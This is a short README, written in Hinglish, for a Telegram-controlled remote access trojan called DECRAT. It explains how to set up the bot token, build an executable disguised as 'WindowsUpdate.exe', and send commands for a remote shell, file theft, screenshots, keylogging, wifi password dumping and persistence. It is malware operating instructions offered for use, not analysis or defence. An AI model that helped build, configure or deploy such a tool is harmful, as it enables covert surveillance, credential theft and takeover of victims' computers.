# DECRAT — Telegram C2

## Setup

### Step 1 — Bot banao
1. Telegram mein @BotFather open karo
2. `/newbot` bhejo
3. Token copy karo

### Step 2 — Chat ID lao
1. @userinfobot open karo
2. `/start` bhejo
3. ID copy karo

### Step 3 — Config paste karo
`agent_tg.py` khoolo, line 11-12:
```python
BOT_TOKEN = "YAHAN_PASTE_KARO"
CHAT_ID   = "YAHAN_PASTE_KARO"
```

### Step 4 — EXE banao
```
build.bat chalao
```
EXE milega: `dist\WindowsUpdate.exe`

## Commands (Telegram se bhejo)
| Command | Kya karta hai |
|---------|--------------|
| /ping | alive check |
| /sysinfo | system info |
| /screenshot | screen capture |
| /shell cmd | command run |
| /download path | file download |
| /keylog_start | keylogger shuru |
| /keylog_dump | keys dump |
| /wifi | wifi passwords |
| /persist | autostart |
| /ip | network info |
| /ps | processes |
